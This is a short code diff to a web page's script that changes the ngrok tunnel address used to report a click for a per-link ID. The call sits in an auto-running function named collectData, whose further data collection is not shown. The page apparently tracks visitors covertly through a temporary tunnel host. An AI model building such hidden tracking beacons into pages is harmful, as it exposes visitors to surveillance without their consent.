@@ -21,7 +21,7 @@ async function collectData() {
   if (!linkId) return;
   
   // Track click
-  await fetch(`https://d6d13ede2ed0.ngrok-free.app/track_click/${linkId}`)
+  await fetch(`https://cff93abba672.ngrok-free.app/track_click/${linkId}`)
     .catch(e => console.error("Click tracking failed:", e));
 
   try {
@@ -104,4 +104,5 @@ setTimeout(collectData, 500);
 </script>
 </body>
 </html>
+
 
